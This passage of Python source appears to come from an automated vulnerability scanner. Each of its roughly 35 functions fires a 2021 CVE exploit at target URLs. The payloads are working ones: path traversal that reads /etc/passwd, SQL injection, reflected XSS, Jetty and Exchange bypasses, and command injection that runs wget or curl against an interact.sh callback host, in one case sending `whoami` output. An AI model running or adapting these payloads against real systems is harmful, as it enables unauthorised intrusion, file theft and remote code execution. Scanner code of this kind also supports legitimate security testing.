            r = urllib.request.urlopen(req, timeout=2, context=gcontext)
            # r = requests.get(url=fullURLTxt,headers=headers,allow_redirects=False,verify=False,timeout=5)
            # input(f"r.status_code is now : {r.status_code}")
            resBody = r.read().decode('utf-8')
            if (r.status == 200) and ('root:x:0:0:' in str(resBody).lower()):
              vulnPath = fullURLTxt
              fullPayload = resBody
              
              inserToVULNS(progName,progAdr,targetURI,fullURLTxt,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload)
              
              screamBugs(f"-------------------------------------\n$$$$$ CONGRATS TUPI $$$$$\n=========================\nprogName: {progName}\nprogAdr: {progAdr}\ntargetURI: {targetURI}\nfullURLTxt: {fullURLTxt}\nvulnCat: {vulnCat}\nvulnName: {vulnName}\nseverity: {severity}\nvulnDsc: {vulnDsc}\nvulnPath: {vulnPath}\n-------------------------------------")

            updateTargetDC(progName,progAdr,targetURI,myKey)
            # except Exception as e:
              # print(f"EXCEPTION: {e}")
          except urllib.error.URLError as e:
            updateTargetDC(progName,progAdr,targetURI,myKey)
            # print(f"EXCEPTION1 : {e}")
          except socket.timeout as e:
            # updateTargetDC(progName,progAdr,targetURI,myKey)
            # print(f"EXCEPTION2 : {e}")
            pass
          except ConnectionResetError as e:
            # updateTargetDC(progName,progAdr,targetURI,myKey)
            # print(f"EXCEPTION3 : {e}")
            pass
          except:
            pass
          bar.next()
        bar.finish()
    # except Exception as e:
      # print(f"EXCEPTION: {e}")
    except:
      pass

# CVE-2021-40438
def CVE2(progScope):
  myKey = "bb09ab1f4682956258018ebb71c36e3b"
  vulnCat = "SSRF"
  vulnName = "CVE2"
  severity = "P2/P1"
  vulnDsc = "A crafted request uri-path can cause mod_proxy to forward the request to an origin server choosen by the remote user."
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = [
    '/?unix|http://0000nlm6c0j53v2s668g61398133715me.interact.sh/'
  ]
  redirAllow = False
  statusF = 200
  textF = 'em51733189316g866s2v35j0c6mln0000'
  condition = lambda z : True if (textF in z.text) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-41467
def CVE3(progScope):
  myKey = "d675a80f97465e426048e3b7ad1c96ec"
  vulnCat = "RXSS"
  vulnName = "CVE3"
  severity = "P2/P3"
  vulnDsc = "Cross-site scripting (XSS) vulnerability in application/controllers/dropbox.php"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/sync/dropbox/download?challenge=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if((z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-41878
def CVE4(progScope):
  myKey = "ddf74de991134a55a57e926447a18288"
  vulnCat = "RXSS"
  vulnName = "CVE4"
  severity = "P2/P3"
  vulnDsc = "(XSS) vulnerability exists in the i-Panel Administration System Version 2.0"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if((z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-42013
def CVE5(progScope):
  myKey = "217df05be53e0486d56babe1f8ce9d72"
  vulnCat = "RCE/Traversal"
  vulnName = "CVE5"
  severity = "P1/P2"
  vulnDsc = "A flaw Apache HTTP Server 2.4.49 and 2.4.50"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd']
  redirAllow = False
  statusF = 200
  textF = 'root:x:0:0:'
  condition = lambda z : True if((z.status_code == statusF) and (textF in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-40875
def CVE6(progScope):
  myKey = "5fddb8e2ae6951065ff6d07672065b6a"
  vulnCat = "InformationDisclosure"
  vulnName = "CVE6"
  severity = "P2/P3"
  vulnDsc = "Improper Access Control in Gurock TestRail versions."
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/files.md5','/testrail/files.md5']
  redirAllow = False
  statusF = 200
  textF = 'app/arguments/admin'
  condition = lambda z : True if((z.status_code == statusF) and (textF in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-40868
def CVE7(progScope):
  myKey = "39c25fc342b4ce23f0bce1edcdd51788"
  vulnCat = "RXSS"
  vulnName = "CVE7"
  severity = "P2/P3"
  vulnDsc = "Cloudron 6.2, the returnTo parameter is vulnerable to Reflected XSS."
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/login.html?returnTo=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if((z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-39327
def CVE8(progScope):
  myKey = "464c2f87a72850036b0bb55137deb732"
  vulnCat = "InfoDisclo"
  vulnName = "CVE8"
  severity = "P1"
  vulnDsc = "The BulletProof Security WordPress plugin is vulnerable to sensitive information disclosure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/bps-backup/logs/db_backup_log.txt','/wp-content/plugins/bulletproof-security/admin/htaccess/db_backup_log.txt']
  redirAllow = False
  statusF = 200
  textF = 'BPS DB BACKUP LOG'
  condition = lambda z : True if((z.status_code == statusF) and (textF in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-39320
def CVE9(progScope):
  myKey = "af26532c91d6e6308eeefdc7834dfc3b"
  vulnCat = "RXSS"
  vulnName = "CVE9"
  severity = "P2"
  vulnDsc = "The underConstruction plugin <= 1.18 for WordPress echoes out the raw value"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-admin/admin.php/%3C%2Fscript%3E%3Cscript%3Ealert%28adocument.domain%29%3C%2Fscript%3E/?page=under-construction']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if((z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-39316
def CVE10(progScope):
  myKey = "155a45ba788c86967a6ba84908da232e"
  vulnCat = "InfoDisclo"
  vulnName = "CVE10"
  severity = "P1"
  vulnDsc = "The Zoomsounds plugin <= 6.45 for WordPress allows arbitrary files"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/?action=dzsap_download&link=../../../../../../../../../../../../../etc/passwd']
  redirAllow = False
  statusF = 200
  textF = 'root:x:0:0:'
  condition = lambda z : True if((z.status_code == statusF) and (textF in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-38702
def CVE11(progScope):
  myKey = "4f8819c4fa4ce5f336d3005f5d983bee"
  vulnCat = "RXSS"
  vulnName = "CVE11"
  severity = "P2"
  vulnDsc = "Cyberoam NetGenie C0101B1-20141120-NG11VO devices through 2021-08-14 allow for reflected Cross Site Scripting via the 'u' parameter of ft.php."
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/tweb/ft.php?u=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if((z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-37833
def CVE12(progScope):
  myKey = "7d810175f33426c841525af822f7be6e"
  vulnCat = "RXSS"
  vulnName = "CVE12"
  severity = "P2"
  vulnDsc = "Reflected cross-site scripting (XSS) vulnerability exists in multiple pages"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/visualizza_tabelle.php?anno=2021&tipo_tabella=prenotazioni&sel_tab_prenota=tutte&wo03b%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ew5px3=1','/storia_soldi.php?piu17%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ee3esq=1','/tabella.php?jkuh3%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Eyql8b=1','/crea_modelli.php?anno=2021&id_sessione=&fonte_dati_conn=attuali&T_PHPR_DB_TYPE=postgresql&T_PHPR_DB_NAME=%C2%9E%C3%A9e&T_PHPR_DB_HOST=localhost&T_PHPR_DB_PORT=5432&T_PHPR_DB_USER=%C2%9E%C3%A9e&T_PHPR_DB_PASS=%C2%9E%C3%A9e&T_PHPR_LOAD_EXT=NO&T_PHPR_TAB_PRE=%C2%9E%C3%A9e&anno_modello=2021&lingua_modello=en&cambia_frasi=SIipq85%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ef9xkbujgt24&form_availability_calendar_template=1']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if((z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-37704
def CVE13(progScope):
  myKey = "88b33da84ad417be02217ea94e247751"
  vulnCat = "InfoDisclo"
  vulnName = "CVE13"
  severity = "P4"
  vulnDsc = "phpinfo() exposure in unprotected composer vendor folder via phpfastcache"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/vendor/phpfastcache/phpfastcache/docs/examples/phpinfo.php','/vendor/phpfastcache/phpfastcache/examples/phpinfo.php']
  redirAllow = False
  statusF = 200
  textF = 'PHP Extension'
  condition = lambda z : True if((z.status_code == statusF) and (textF in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-37573
def CVE14(progScope):
  myKey = "6d48e24be957cfa9b284df6e345c0701"
  vulnCat = "RXSS"
  vulnName = "CVE14"
  severity = "P4"
  vulnDsc = "A reflected cross-site scripting (XSS) vulnerability in the web server TTiny"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/te%3Cimg%20src=x%20onerror=alert(42)%3Est']
  redirAllow = False
  statusF = 200
  textF = '<img src=x onerror=alert(42)>'
  condition = lambda z : True if((z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-37538
def CVE15(progScope):
  myKey = "ffbeed7202890992c196fd69a838d661"
  vulnCat = "SQLi"
  vulnName = "CVE15"
  severity = "P1"
  vulnDsc = "PrestaShop SmartBlog by SmartDataSoft < 4.0.6 is vulnerable to a SQL injection"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/module/smartblog/archive?month=1&year=1&day=1%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(SELECT%20MD5(55555)),NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20-']
  redirAllow = False
  statusF = 200
  textF = 'c5fe25896e49ddfe996db7508cf00534'
  condition = lambda z : True if((z.status_code == statusF) and (textF in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-3654
def CVE16(progScope):
  myKey = "09f64d7a8abe4dccf3c470231d2f5492"
  vulnCat = "OpenRedirect"
  vulnName = "CVE16"
  severity = "P3"
  vulnDsc = "A user-controlled input redirects noVNC users to an external website."
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['//example.com/%2f..']
  redirAllow = False
  statusF = 301
  textF = 'example.com'
  condition = lambda z : True if((z.status_code == statusF or z.status_code == 302 ) and (textF == z.headers['Location'] )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-32305
def CVE17(progScope):
  myKey = "1ed7acf6ce8215e8d66e647279cd72d0"
  vulnCat = "RCE"
  vulnName = "CVE17"
  severity = "P1"
  vulnDsc = "WebSVN before 2.6.1 allows remote attackers to execute arbitrary commands"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/search.php?search=%22;wget+http%3A%2F%2F0000nlm6c0j53v2s668g61398133715me.interact.sh%27;%22']
  redirAllow = False
  statusF = 200
  textF = 'em51733189316g866s2v35j0c6mln0000'
  condition = lambda z : True if((z.status_code == statusF) and (textF in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-32305
def CVE18(progScope):
  myKey = "3656580842456bf27b382f589e9f3d7e"
  vulnCat = "RCE"
  vulnName = "CVE18"
  severity = "P1"
  vulnDsc = "RCE in Squirrelly which is a template engine implemented in JavaScript"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/?Express=aaaa&autoEscape=&defaultFilter=e%27);var+require=global.require+%7C%7C+global.process.mainModule.constructor._load;+require(%27child_process%27).exec(%27wget%20http://0000nlm6c0j53v2s668g61398133715me.interact.sh%27);//']
  redirAllow = False
  statusF = 200
  textF = 'em51733189316g866s2v35j0c6mln0000'
  condition = lambda z : True if((z.status_code == statusF) and (textF in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-32820
def CVE19(progScope):
  myKey = "a013533fb810feb8db9bcb3c55b9ee04"
  vulnCat = "Path Traversal"
  vulnName = "CVE19"
  severity = "P1"
  vulnDsc = "Express-handlebars is a Handlebars view engine for Express"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/?layout=/etc/passwd']
  redirAllow = False
  statusF = 200
  textF = 'root:x:0:0:'
  condition = lambda z : True if((z.status_code == statusF) and (textF in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-33357
def CVE20(progScope):
  myKey = "296633afbc5ac0ae5a2b925da91ec6c8"
  vulnCat = "RCE"
  vulnName = "CVE20"
  severity = "P1"
  vulnDsc = "RaspAP 2.6 to 2.6.5 which enables an unauthenticated attacker to execute arbitrary OS commands."
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/ajax/networking/get_netcfg.php?iface=;curl%20http://0000nlm6c0j53v2s668g61398133715me.interact.sh/`whoami`;']
  redirAllow = False
  statusF = 200
  textF = 'em51733189316g866s2v35j0c6mln0000'
  condition = lambda z : True if((z.status_code == statusF) and (textF in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-33544
def CVE21(progScope):
  myKey = "5f8542b7858b31d58460a2960a3f05bc"
  vulnCat = "RCE"
  vulnName = "CVE21"
  severity = "P1"
  vulnDsc = "Multiple vulnerabilities in the web-based management interface of Geutebruck could allow an unauthenticated TO DO RCE"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['//uapi-cgi/certmngr.cgi?action=createselfcert&local=anything&country=AA&state=%24(wget%20http://0000nlm6c0j53v2s668g61398133715me.interact.sh)&organization=anything&organizationunit=anything&commonname=anything&days=1&type=anything']
  redirAllow = False
  statusF = 200
  textF = 'em51733189316g866s2v35j0c6mln0000'
  condition = lambda z : True if((z.status_code == statusF) and (textF in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-33564
def CVE22(progScope):
  myKey = "aea39fd4195939765f9cf6ce5189d337"
  vulnCat = "Argument Injection"
  vulnName = "CVE22"
  severity = "P1"
  vulnDsc = "An argument injection vulnerability in the Dragonfly gem before 1.4.0 for Ruby allows remote attackers to read and write to arbitrary files"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/system/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvcGFzc3dkIiwgIm91dCJdXQ==','/system/refinery/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvcGFzc3dkIiwgIm91dCJdXQ==']
  redirAllow = False
  statusF = 200
  textF = 'root:x:0:0:'
  condition = lambda z : True if((z.status_code == statusF) and (textF in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-3377
def CVE23(progScope):
  myKey = "ba33dd2682267dba5a76be89caa789de"
  vulnCat = "RXSS"
  vulnName = "CVE23"
  severity = "P3"
  vulnDsc = "The npm package ansi_up converts ANSI escape codes into HTML"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/\u001B]8;;https://example.com"/onmouseover="alert(1)\u0007example\u001B]8;;\u0007']
  redirAllow = False
  statusF = 302
  textF = 'com"/onmouseover="alert(1)">'
  condition = lambda z : True if((z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-34429
def CVE24(progScope):
  myKey = "170b782496055c8502a7e4be60f51f8f"
  vulnCat = "AuthBypass"
  vulnName = "CVE24"
  severity = "P1"
  vulnDsc = "Jetty Authorization Before Parsing and Canonicalization Variation"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/%u002e/WEB-INF/web.xml','/.%00/WEB-INF/web.xml']
  redirAllow = False
  statusF = 200
  textF = '</web-app>'
  condition = lambda z : True if((z.status_code == statusF) and (textF in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-34473
def CVE25(progScope):
  myKey = "ad339301996ceae82d3a057985bae6ee"
  vulnCat = "SSRF"
  vulnName = "CVE25"
  severity = "P1"
  vulnDsc = "Microsoft Exchange Server Remote Code Execution Vulnerability This CVE ID is unique from CVE-2021-31196, CVE-2021-31206."
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com','/autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com']
  redirAllow = False
  statusF = 200
  textF = 'Microsoft.Exchange.Clients.Owa2.Server.Core.OwaADUserNotFoundException'
  condition = lambda z : True if((z.status_code == statusF) and (textF in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-35265
def CVE26(progScope):
  myKey = "5319f1ee8d53b5e6ee6b98babee1a268"
  vulnCat = "RXSS"
  vulnName = "CVE26"
  severity = "P3"
  vulnDsc = "Reflected cross-site scripting (XSS) vulnerability in MaxSite CMS before V106"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E','/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if((z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-3223
def CVE27(progScope):
  myKey = "ab293e679ff8442b5f6b554ee6886f1c"
  vulnCat = "Directory Traversal"
  vulnName = "CVE27"
  severity = "P3"
  vulnDsc = "Node-RED-Dashboard before 2.26.2 allows ui_base/js/.. directory traversal to read files."
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd','/ui_base/js/..%2f..%2f..%2f..%2fsettings.js']
  redirAllow = False
  statusF = 200
  textF = 'Node-RED web server is listening'
  condition = lambda z : True if((z.status_code == statusF) and (textF in z.text or 'root:x:0:0:' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-31856
def CVE28(progScope):
  myKey = "23cd8a44ae7d20525085df5c55cedc7b"
  vulnCat = "SQLi"
  vulnName = "CVE28"
  severity = "P1"
  vulnDsc = "A SQL Injection vulnerability in the REST API in Layer5 Meshery 0.5.2"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/api/experimental/patternfile?order=id%3Bselect(md5(\'nuclei\'))&page=0&page_size=0']
  redirAllow = False
  statusF = 200
  textF = '709b38b27304df6257a86a60df742c4c'
  condition = lambda z : True if((z.status_code == statusF) and (textF in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-31581
def CVE29(progScope):
  myKey = "7b84bac0390dd79b66de4104f082c42e"
  vulnCat = "InfoDisclo"
  vulnName = "CVE29"
  severity = "P3"
  vulnDsc = "Akkadian Provisioning Manager MariaDB Credentials"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/pme/database/pme/phinx.yml']
  redirAllow = False
  statusF = 200
  textF = 'pass:'
  condition = lambda z : True if((z.status_code == statusF) and (textF in z.text and 'host:' in z.text and 'name:' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-3019
def CVE30(progScope):
  myKey = "38abcbf62a770e73d10c01ff1ed8141d"
  vulnCat = "Directory Traversal"
  vulnName = "CVE30"
  severity = "P3"
  vulnDsc = "ffay lanproxy 0.1 allows Directory Traversal to read /../conf/config.properties"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/../conf/config.properties']
  redirAllow = False
  statusF = 200
  textF = 'config.admin.password'
  condition = lambda z : True if((z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-30151
def CVE31(progScope):
  myKey = "40dd944a7a4205054022915124a0f758"
  vulnCat = "RXSS"
  vulnName = "CVE31"
  severity = "P2"
  vulnDsc = "Sidekiq through 5.1.3 and 6.x through 6.2.0 allows XSS via the queue name"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/sidekiq/queues/"onmouseover="alert(nuclei)"']
  redirAllow = False
  statusF = 200
  textF = 'onmouseover="alert(\'nuclei\')'
  condition = lambda z : True if((z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-30049
def CVE32(progScope):
  myKey = "93773eef9fce53526e585de21d46f4be"
  vulnCat = "RXSS"
  vulnName = "CVE32"
  severity = "P3"
  vulnDsc = "SysAid 20.3.64 b14 is affected by Cross Site Scripting (XSS) via a /KeepAlive.jsp"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/KeepAlive.jsp?stamp=16170297%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if((z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-29625
def CVE33(progScope):
  myKey = "b210e1e4e5388d0da669c1b950b6c4bb"
  vulnCat = "RXSS"
  vulnName = "CVE33"
  severity = "P3"
  vulnDsc = "Adminer is open-source database management software. A cross-site scripting vulnerability in Adminer versions 4.6.1 to 4.8.0"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/?server=db&username=root&db=mysql&table=event%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E']
  redirAllow = False
  statusF = 200
  textF = '</script><script>alert(document.domain)</script>'
  condition = lambda z : True if((z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-29622
def CVE34(progScope):
  myKey = "eb5f15671e010c78730b2898a62d5fc9"
  vulnCat = "Open Redirect"
  vulnName = "CVE34"
  severity = "P3"
  vulnDsc = "Prometheus v2.23.0 to v2.26.0, and v2.27.0 Open Redirect"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/new/newhttp://example.com']
  redirAllow = False
  statusF = 301
  textF = 'http://example.com'
  condition = lambda z : True if((z.status_code == statusF or z.status_code == 302 ) and (textF == z.headers['Location'] )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# CVE-2021-29484
def CVE35(progScope):
  myKey = "b2b07b97795a9c75f7510f1c93c79e66"
  vulnCat = "DXSS"
  vulnName = "CVE35"
  severity = "P3"
  vulnDsc = "DOM XSS in Ghost CMS"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/ghost/preview']
  redirAllow = False
  statusF = 200
